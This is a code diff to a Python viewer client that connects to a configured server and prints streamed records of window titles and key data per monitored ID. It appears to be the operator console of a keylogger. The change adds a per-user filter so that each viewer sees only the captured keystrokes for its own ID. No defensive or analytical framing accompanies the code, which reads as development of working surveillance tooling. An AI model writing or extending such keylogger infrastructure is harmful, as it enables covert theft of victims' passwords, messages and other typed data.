@@ -4,11 +4,11 @@ import time
 
 from config import server_config
 
-
 class ViewClient:
-    def __init__(self, host, port):
+    def __init__(self, host, port, username):
         self.host = host
         self.port = port
+        self.username = username
         self.sock = None
 
     def connect(self):
@@ -17,10 +17,10 @@ class ViewClient:
                 self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.sock.connect((self.host, self.port))
 
-                hello = json.dumps({"type": "viewer"}) + "\n"
+                hello = json.dumps({"type": "viewer", "username": self.username}) + "\n"
                 self.sock.sendall(hello.encode())
 
-                print("[+] Connected to server viewer mode")
+                print("[+] Connected to server as viewer:", self.username)
                 return
             except:
                 print("[!] Cannot connect, retrying...")
@@ -43,7 +43,8 @@ class ViewClient:
 
                     try:
                         msg = json.loads(line)
-                        print(f"[{msg['LoggedAt']}] {msg['ViewID']} | {msg['WindowTitle']} -> {msg['KeyData']}")
+                        if msg.get("ViewID") == self.username:
+                            print(f"[{msg['LoggedAt']}] {msg['ViewID']} | {msg['WindowTitle']} -> {msg['KeyData']}")
                     except:
                         pass
 
@@ -51,6 +52,6 @@ class ViewClient:
                 print("[!] Connection lost, retry...")
                 self.connect()
 
-
 if __name__ == "__main__":
-    ViewClient(server_config.SERVER_IP, server_config.SERVER_HOST).start()
+    username = input("Enter viewer username: ")
+    ViewClient(server_config.SERVER_IP, server_config.SERVER_HOST, username).start()
